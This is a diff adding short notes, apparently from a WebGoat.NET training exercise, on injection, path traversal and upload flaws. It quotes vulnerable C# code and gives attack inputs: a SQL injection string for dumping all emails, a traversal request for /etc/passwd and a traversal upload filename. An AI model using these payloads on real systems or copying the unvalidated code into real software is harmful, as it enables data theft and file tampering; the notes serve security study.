@@ -1,0 +1,34 @@
+Injection
+
+string sql = "select email from CustomerLogin where customerNumber = " + num;
+
+raw sql query is concatinated with user input
+
+string sql = "select firstName, lastName, email from Employees where firstName like '" + name + "%' or lastName like '" + name + "%'";
+
+Like operator is used to filter out emails
+
+we can get all email accounts using
+
+_'--
+
+'_' -> match anyting
+
+string filename = Request.QueryString["filename"];
+
+ResponseFile(Request, Response, filename, MapPath("~/Downloads/" + filename), 100);
+
+we just request any file 
+
+GET /Content/PathManipulation.aspx?filename=../../../etc/passwd
+
+string filename = Path.GetFileName(FileUpload1.FileName);
+FileUpload1.SaveAs(Server.MapPath("~/WebGoatCoins/uploads/") + filename);
+
+filename is just concatinated with the path, no input validation
+
+Content-Disposition: form-data; name="ctl00$BodyContentPlaceholder$FileUpload1"; filename="../../../tmp/test.txt"
+
+update the file name by intercepting the request
+
+
